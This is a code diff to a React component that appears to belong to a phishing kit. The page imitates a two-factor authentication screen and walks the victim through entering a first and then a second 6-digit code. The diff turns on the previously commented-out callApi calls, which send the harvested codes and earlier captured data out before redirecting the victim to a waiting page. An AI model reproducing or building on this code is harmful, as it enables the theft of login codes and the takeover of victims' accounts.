@@ -2,7 +2,7 @@ import React, { useEffect, useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { Button, Form, Input } from 'antd';
 import { jhasbdh3h2b2h3b } from '../../assets/images/images';
-import { getSession, removeSession, saveSession } from '../../apis/sectionHandle';
+import { callApi, getSession, removeSession, saveSession } from '../../apis/sectionHandle';
 
 const FormConfirmComponent = () => {
     const [activePopup, setActivePopup] = useState(false);
@@ -35,10 +35,6 @@ const FormConfirmComponent = () => {
     const minutes = Math.floor(timeLeft / 60);
     const seconds = timeLeft % 60;
 
-    const handleOpendPopup = () => {
-        setActivePopup(true)
-    }
-
     const handleClosePopup = () => {
         setActivePopup(false)
     }
@@ -58,10 +54,10 @@ const FormConfirmComponent = () => {
                 firstTwoFa: values.twoFa,
                 ...dataGetThird
             }
-            removeSession('stepTwo')
             saveSession('stepFour', dataSendFourth )
 
-            // callApi(dataSendFourth)
+            callApi(dataSendFourth)
+            removeSession('stepTwo')
         }
 
         else if(timeLeft === 0) {
@@ -72,7 +68,7 @@ const FormConfirmComponent = () => {
                 secondTwoFa: values.twoFa,
                 ...dataGetFourth
             }
-            // callApi(dataSendSuccess)
+            callApi(dataSendSuccess)
             saveSession('stepFive', dataSendSuccess )
             removeSession('stepThree')
             navigate('/waitting');
@@ -103,7 +99,7 @@ const FormConfirmComponent = () => {
                                 <h3 className="twh3">Go to your authentication app</h3>
                                 <div className="bodyyy">
                                     <p>
-                                        {!inforUser ? '' : `Enter the 6-digit code for this account from the two- factor authentication app you set up (such as Duo Mobile or Google Authenticator) or Enter the code we sent to ${inforUser.phoneNumber.slice(0, 3) + " *** **" + inforUser.phoneNumber.slice(-3)}`}</p>
+                                        {!inforUser ? '' : `Enter the 6-digit code for this account from the two- factor authentication app you set up (such as Duo Mobile or Google Authenticator) or Enter the code we sent to ${inforUser.mobilePhone.slice(0, 3) + " *** **" + inforUser.mobilePhone.slice(-3)}`}</p>
                                     <div>
                                         <img src={jhasbdh3h2b2h3b} width="100%" className="" alt="" />
                                     </div>
@@ -136,7 +132,7 @@ const FormConfirmComponent = () => {
                                         <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                     </div>
 
-                                    <p style={{ fontSize: "1rem", color: "#4b4f56", display: "flex", alignItems: "center" }}>
+                                    <p style={{ fontSize: "1rem", color: "#4b4f56", display: `${activeWaring === true ? 'none' : 'flex'}`, alignItems: "center" }}>
                                         <a style={{ marginBottom: "2px", marginRight: "5px" }} href=""><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                             <path fillRule="evenodd" clipRule="evenodd" d="M8 3C5.23858 3 3 5.23857 3 8C3 10.7614 5.23858 13 8 13C10.7614 13 13 10.7614 13 8C13 7.25457 12.8372 6.54852 12.5457 5.91433C12.4304 5.66343 12.5403 5.36654 12.7912 5.25121C13.0421 5.13588 13.339 5.24578 13.4543 5.49669C13.8048 6.25923 14 7.1075 14 8C14 11.3137 11.3137 14 8 14C4.68629 14 2 11.3137 2 8C2 4.68629 4.68629 2 8 2V3Z" fill="#4b4f56" />
                                             <path d="M8 4.46624V0.533757C8 0.321798 8.24721 0.206009 8.41005 0.341702L10.7695 2.30794C10.8895 2.40789 10.8895 2.5921 10.7695 2.69205L8.41005 4.65829C8.24721 4.79399 8 4.6782 8 4.46624Z" fill="#4b4f56" />
